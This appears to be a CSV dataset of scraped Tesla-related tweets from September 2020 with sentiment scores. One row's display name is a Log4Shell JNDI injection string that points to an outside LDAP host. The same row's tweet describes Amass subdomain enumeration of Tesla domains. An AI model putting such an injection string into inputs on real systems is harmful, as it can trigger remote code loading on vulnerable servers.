,id,conversation_id,created_at,date,time,timezone,user_id,username,name,place,tweet,language,mentions,urls,photos,replies_count,retweets_count,likes_count,hashtags,cashtags,link,retweet,quote_url,video,thumbnail,near,geo,source,user_rt_id,user_rt,retweet_id,reply_to,retweet_date,translate,trans_src,trans_dest,negative,neutral,positive
0,1305286104589856768,1305286104589856768,2020-09-13 23:23:53 UTC,2020-09-13,23:23:53,0,788558465304240128,alancane604,Alan Cane,,"Just wondering, if someone misses a few payments on their Tesla will the car just drive itself back to the factory? Asking for a friend. @elonmusk",en,"[{'screen_name': 'elonmusk', 'name': 'elon musk', 'id': '44196397'}]",[],[],3,10,74,[],[],https://twitter.com/AlanCane604/status/1305286104589856768,False,,0,,,,,,,,[],,,,,0.20183004,0.76957667,0.028593361
1,1305284791038881797,1305284791038881797,2020-09-13 23:18:39 UTC,2020-09-13,23:18:39,0,1257081948700315650,jc_finance,JC Finance & Investing📈📊,,"Tesla has been quiet on the acquisition of Hibar systems, a leader in precision manufacturing of small cell batteries through a highly mechanized pump injection system.  Expect more on this on battery day. $TSLA",en,[],[],[],10,19,251,[],['tsla'],https://twitter.com/JC_finance/status/1305284791038881797,False,,0,,,,,,,,[],,,,,0.07222615,0.86292,0.06485378
2,1305280673650036737,1305280673650036737,2020-09-13 23:02:18 UTC,2020-09-13,23:02:18,0,1089376824,itsecurityguard,?${jndi:ldap://resolv.network/a},,"Amass enumerated 832 Tesla Domains, stored the output in separate folders and created a database containing all the information, allowing you to monitor for changes 😍  what more can you ask for?  domains()  { cat */amass.json | jq -r '.name' }  to get all the found subdomains 👑  https://t.co/laSJCv1TEg",en,[],[],['https://pbs.twimg.com/media/Eh1ISjBWAAQt7Rt.jpg'],5,40,165,[],[],https://twitter.com/ITSecurityguard/status/1305280673650036737,False,,1,https://pbs.twimg.com/media/Eh1ISjBWAAQt7Rt.jpg,,,,,,,[],,,,,0.0034597027,0.109310776,0.88722956
3,1305279892993572864,1305279892993572864,2020-09-13 22:59:12 UTC,2020-09-13,22:59:12,0,259725229,valaafshar,Vala Afshar,,"Founded:  1847 Siemens 1865 Nokia 1876 Ericsson 1911 IBM 1928 Motorola 1938 Samsung 1939 HP 1946 Sony 1968 Intel 1975 Microsoft 1976 Apple 1984 Cisco,  Dell 1994 Amazon 1997 Netflix 1998 Google 1999 Salesforce,  Alibaba 2003 Tesla 2004 Facebook 2006 Twitter 2008 Airbnb 2009 Uber",en,[],[],[],4,68,129,[],[],https://twitter.com/ValaAfshar/status/1305279892993572864,False,,0,,,,,,,,[],,,,,0.01612665,0.90752715,0.076346345
4,1305275869527588864,1305275869527588864,2020-09-13 22:43:12 UTC,2020-09-13,22:43:12,0,89622490,pete_gruber,Pete Gruber,,"It is always and honor when we receive a Signature Tesla Roadster for service. There were only 100 in the USA, and 250 in Europe.  These early examples, were in many ways validation prototypes, that helped usher in the EV revolution, and made Tesla the phenomenal company it is.  https://t.co/TrSnJM1SdT",en,[],[],"['https://pbs.twimg.com/media/Eh1FS7qVkAEVYq9.jpg', 'https://pbs.twimg.com/media/Eh1FWe3UYAEgmtV.jpg', 'https://pbs.twimg.com/media/Eh1FYTEUwAANPrh.jpg', 'https://pbs.twimg.com/media/Eh1FaGdUcAEV5P7.jpg']",7,13,81,[],[],https://twitter.com/Pete_Gruber/status/1305275869527588864,False,,1,https://pbs.twimg.com/media/Eh1FS7qVkAEVYq9.jpg,,,,,,,[],,,,,0.0027477874,0.029540949,0.9677113
5,1305269995702681600,1305269995702681600,2020-09-13 22:19:52 UTC,2020-09-13,22:19:52,0,293049767,tallgudge,Todd🦾🧠🔋🏄‍♂️,,I swear a clean Tesla goes faster than a dirty one,en,[],[],[],17,4,115,[],[],https://twitter.com/TALLGUDGE/status/1305269995702681600,False,,0,,,,,,,,[],,,,,0.1609135,0.36095378,0.47813278
6,1305263941371789313,1305263941371789313,2020-09-13 21:55:48 UTC,2020-09-13,21:55:48,0,1161703589942878208,garyblack00,Gary Black,,"When a $TSLAQ gives me grief about being long $TSLA when I’m short $NKLA, I ask two questions: 1/ Have you ever owned a Tesla? 2/ Have you ever run the numbers on TSLA volumes if EV penetration goes from 3% to 50% and TSLA holds its EV share? Both shut them down fairly quickly.",en,[],[],[],30,31,390,[],"['tslaq', 'tsla', 'nkla']",https://twitter.com/garyblack00/status/1305263941371789313,False,,0,,,,,,,,[],,,,,0.53036934,0.43888155,0.030749101
7,1305260951910797313,1305260951910797313,2020-09-13 21:43:56 UTC,2020-09-13,21:43:56,0,1689516060,vincent13031925,vincentyu.eth,,Tesla Model Y Produced in Fremont Factory May Already Be Using Single-Piece Rear Cast by Giga Press  via @Tesmanian_com  by @EvaFoxU &amp; @SmokeyShorts   https://t.co/Zm2uwfdeBP,en,"[{'screen_name': 'tesmanian_com', 'name': 'tesmanian.com', 'id': '1100520274200416256'}, {'screen_name': 'evafoxu', 'name': 'eva fox 狐🦊❤️🇺🇦', 'id': '959471389282578432'}, {'screen_name': 'smokeyshorts', 'name': 'smokey 🦊🇺🇦', 'id': '1142075458231492608'}]",['https://www.tesmanian.com/blogs/tesmanian-blog/model-y-probably-already-produces-using-new-giga-press-cast-parts'],[],11,38,246,[],[],https://twitter.com/vincent13031925/status/1305260951910797313,False,,0,,,,,,,,[],,,,,0.005773707,0.92414707,0.070079416
8,1305260657223151616,1305260657223151616,2020-09-13 21:42:45 UTC,2020-09-13,21:42:45,0,1100520274200416256,tesmanian_com,Tesmanian.com,,Tesla Model Y Produced in Fremont Factory May Already Be Using Single-Piece Rear Cast by Giga Press   https://t.co/bQvCwvIrOP,en,[],['https://www.tesmanian.com/blogs/tesmanian-blog/model-y-probably-already-produces-using-new-giga-press-cast-parts'],[],2,10,158,[],[],https://twitter.com/Tesmanian_com/status/1305260657223151616,False,,0,,,,,,,,[],,,,,0.0074668103,0.9277973,0.064735666
9,1305251265463549955,1305251265463549955,2020-09-13 21:05:26 UTC,2020-09-13,21:05:26,0,17694421,tacosandteslas,🌮TACOS +⚡️TESLAS 🇺🇦 (AL),,#HellaTeslas as usual here in Silicon Valley. More than half my uncle’s street are rocking EVs. @omg_tesla @teslaownersSV  https://t.co/gsoLFqUp3R,en,"[{'screen_name': 'omg_tesla', 'name': 'omg_10,11.2', 'id': '176698631'}, {'screen_name': 'teslaownerssv', 'name': 'tesla owners silicon valley', 'id': '1016059981907386368'}]",[],[],4,8,103,['hellateslas'],[],https://twitter.com/TacosandTeslas/status/1305251265463549955,False,,1,https://pbs.twimg.com/ext_tw_video_thumb/1305250401713700864/pu/img/bwJfKcqVAt0YiM69.jpg,,,,,,,[],,,,,0.003978791,0.0804309,0.9155903
